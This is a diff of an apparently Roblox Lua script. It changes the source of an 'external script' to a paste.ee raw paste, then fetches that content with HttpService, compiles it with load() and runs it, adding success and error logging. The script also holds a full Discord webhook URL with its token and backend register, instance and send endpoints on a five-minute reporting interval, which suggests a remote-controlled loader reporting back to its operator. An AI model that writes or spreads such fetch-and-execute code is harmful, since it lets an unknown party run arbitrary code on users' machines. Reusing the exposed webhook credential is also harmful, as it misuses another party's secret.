@@ -9,7 +9,7 @@ local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
 local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
-local EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/Ahmadsaukanihsb/teleport/refs/heads/main/external"
+local EXTERNAL_SCRIPT_URL = "https://paste.ee/r/kEHhQbpL"
 
 local REPORT_INTERVAL = 300 -- 5 minutes
 local DEBUG_MODE = true
@@ -152,26 +152,39 @@ end
 -- ====================== [SCRIPT MONITORING] ======================
 
 local function executeExternalScript()
+    log("Fetching script from: " .. EXTERNAL_SCRIPT_URL)
+
     local success, content = pcall(function()
-        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL)
     end)
+
     if not success then
-        log("Failed to fetch external script: " .. tostring(content))
+        log("❌ Fetch error: " .. tostring(content))
         return false
     end
 
-    local fn, err = loadstring(content)
-    if not fn then
-        log("Failed to load external script: " .. tostring(err))
+    if not content or #content < 10 then
+        log("❌ Script content too short or empty")
         return false
     end
+
+    log("✅ Script fetched. Attempting to load...")
+
+    local fn, err = load(content)
+    if not fn then
+        log("❌ Load error: " .. tostring(err))
+        return false
+    end
+
+    log("✅ Script loaded. Executing...")
 
     local success2, result = pcall(fn)
     if not success2 then
-        log("Script execution failed: " .. tostring(result))
+        log("❌ Execution error: " .. tostring(result))
         return false
     end
 
+    log("✅ Script executed successfully")
     return true
 end
 
